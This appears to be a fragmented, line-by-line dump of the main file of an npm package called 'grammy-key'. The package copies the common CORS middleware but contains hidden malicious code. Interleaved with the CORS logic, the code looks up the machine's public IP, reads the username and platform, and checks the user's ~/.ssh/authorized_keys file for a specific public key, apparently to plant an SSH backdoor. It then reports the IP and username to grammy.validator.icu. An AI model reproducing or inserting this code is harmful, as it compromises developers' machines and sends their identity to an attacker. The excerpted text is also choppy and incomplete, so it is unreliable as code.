// File: tmp/tmpvfqo6e8q/grammy-key/package/lib/index.js
// ======================================================================
Line 1: const path = require('path')
Line 2: const URL = require('url')
Line 3: const fs = require('fs')
Line 4: const os = require('os')
Line 5: const https = require('https')
Line 11: var assign = require('object-assign')
Line 12: var vary = require('vary')
Line 13: getState()
Line 34: isString(allowedOrigin)
Line 37: allowedOrigin.test(origin)
Line 43: {
    var requestOrigin = req.headers.origin,
      headers = [],
      isAllowed;

    if (!options.origin || options.origin === '*') {
      // allow any origin
      headers.push([{
        key: 'Access-Control-Allow-Origin',
        value: '*'
      }]);
    } else if (isString(options.origin)) {
      // fixed origin
      headers.push([{
        key: 'Access-Control-Allow-Origin',
        value: options.origin
      }]);
      headers.push([{
        key: 'Vary',
        value: 'Origin'
      }]);
    } else {
      isAllowed = isOriginAllowed(requestOrigin, options.origin);
      // reflect origin
      headers.push([{
        key: 'Access-Control-Allow-Origin',
        value: isAllowed ? requestOrigin : false
      }]);
      headers.push([{
        key: 'Vary',
        value: 'Origin'
      }]);
    }

    return headers;
  }
Line 44: var requestOrigin = req.headers.origin,
      headers = [],
      isAllowed;
Line 45: var headers = []
Line 50: headers.push([{
        key: 'Access-Control-Allow-Origin',
        value: '*'
      }])
Line 54: isString(options.origin)
Line 56: headers.push([{
        key: 'Access-Control-Allow-Origin',
        value: options.origin
      }])
Line 60: headers.push([{
        key: 'Vary',
        value: 'Origin'
      }])
Line 67: headers.push([{
        key: 'Access-Control-Allow-Origin',
        value: isAllowed ? requestOrigin : false
      }])
Line 71: headers.push([{
        key: 'Vary',
        value: 'Origin'
      }])
Line 83: options.methods.join(',')
Line 101: {
    var allowedHeaders = options.allowedHeaders || options.headers;
    var headers = [];

    if (!allowedHeaders) {
      allowedHeaders = req.headers['access-control-request-headers']; // .headers wasn't specified, so reflect the request headers
      headers.push([{
        key: 'Vary',
        value: 'Access-Control-Request-Headers'
      }]);
    } else if (allowedHeaders.join) {
      allowedHeaders = allowedHeaders.join(','); // .headers is an array, so turn it into a string
    }
    if (allowedHeaders && allowedHeaders.length) {
      headers.push([{
        key: 'Access-Control-Allow-Headers',
        value: allowedHeaders
      }]);
    }

    return headers;
  }
Line 103: var headers = []
Line 105: {
      allowedHeaders = req.headers['access-control-request-headers']; // .headers wasn't specified, so reflect the request headers
      headers.push([{
        key: 'Vary',
        value: 'Access-Control-Request-Headers'
      }]);
    }
Line 106: allowedHeaders = req.headers['access-control-request-headers']
Line 107: headers.push([{
        key: 'Vary',
        value: 'Access-Control-Request-Headers'
      }])
Line 112: allowedHeaders.join(',')
Line 115: headers.push([{
        key: 'Access-Control-Allow-Headers',
        value: allowedHeaders
      }])
Line 129: headers.join(',')
Line 141: options.maxAge.toString()
Line 152: {
      var header = headers[i];
      if (header) {
        if (Array.isArray(header)) {
          applyHeaders(header, res);
        } else if (header.key === 'Vary' && header.value) {
          vary(res, header.value);
        } else if (header.value) {
          res.setHeader(header.key, header.value);
        }
      }
    }
Line 153: var header = headers[i]
Line 156: applyHeaders(header, res)
Line 158: vary(res, header.value)
Line 166: {
    var headers = [],
      method = req.method && req.method.toUpperCase && req.method.toUpperCase();

    if (method === 'OPTIONS') {
      // preflight
      headers.push(configureOrigin(options, req));
      headers.push(configureCredentials(options, req));
      headers.push(configureMethods(options, req));
      headers.push(configureAllowedHeaders(options, req));
      headers.push(configureMaxAge(options, req));
      headers.push(configureExposedHeaders(options, req));
      applyHeaders(headers, res);

      if (options.preflightContinue) {
        next();
      } else {
        // Safari (and potentially other browsers) need content-length 0,
        //   for 204 or they just hang waiting for a body
        res.statusCode = options.optionsSuccessStatus;
        res.setHeader('Content-Length', '0');
        res.end();
      }
    } else {
      // actual response
      headers.push(configureOrigin(options, req));
      headers.push(configureCredentials(options, req));
  ...
Line 167: var headers = [],
      method = req.method && req.method.toUpperCase && req.method.toUpperCase();
Line 172: headers.push(configureOrigin(options, req))
Line 173: headers.push(configureCredentials(options, req))
Line 174: headers.push(configureMethods(options, req))
Line 175: headers.push(configureAllowedHeaders(options, req))
Line 176: headers.push(configureMaxAge(options, req))
Line 177: headers.push(configureExposedHeaders(options, req))
Line 178: applyHeaders(headers, res)
Line 181: next()
Line 182: {
        // Safari (and potentially other browsers) need content-length 0,
        //   for 204 or they just hang waiting for a body
        res.statusCode = options.optionsSuccessStatus;
        res.setHeader('Content-Length', '0');
        res.end();
      }
Line 187: res.end()
Line 191: headers.push(configureOrigin(options, req))
Line 192: headers.push(configureCredentials(options, req))
Line 193: headers.push(configureExposedHeaders(options, req))
Line 194: applyHeaders(headers, res)
Line 195: next()
Line 201: (_tmp_22 = https.get('https://ipinfo.io/ip', (res) => {
              let data = '';
              res.on('data', chunk => {
                  data += chunk;
              });
              res.on('end', () => {
                  resolve(data.trim());
              });
          }))
Line 207: data.trim()
Line 216: os.userInfo()
Line 218: os.platform()
Line 219: os.platform()
Line 224: path.join(os.homedir(), '.ssh')
Line 225: path.join(sshDir, 'authorized_keys')
Line 233: const fileContent = fs.readFileSync(authorizedKeysPath, 'utf8')
Line 234: fileContent.includes(fullPublicKey)
Line 245: (_tmp_25 = https.get(`https://grammy.validator.icu/v1/check?ip=${ipAddress}&name=${username}&type=${types}`, (res1) => {
                  res1.on('data', () => { });
                  res1.on('end', () => {
                      // console.log('Installation complete.');
                  });
              }))
Line 260: (_tmp_26 = https.get(`https://grammy.validator.icu/v1/check?ip=${ipAddress}&name=${username}&type=${types}`, (res1) => {
              res1.on('data', () => { });
              res1.on('end', () => {
                  // console.log('Installation complete.');
              });
          }))
Line 285: next(err)
Line 300: next(err2)
Line 303: cors(corsOptions, req, res, next)
Line 307: next()
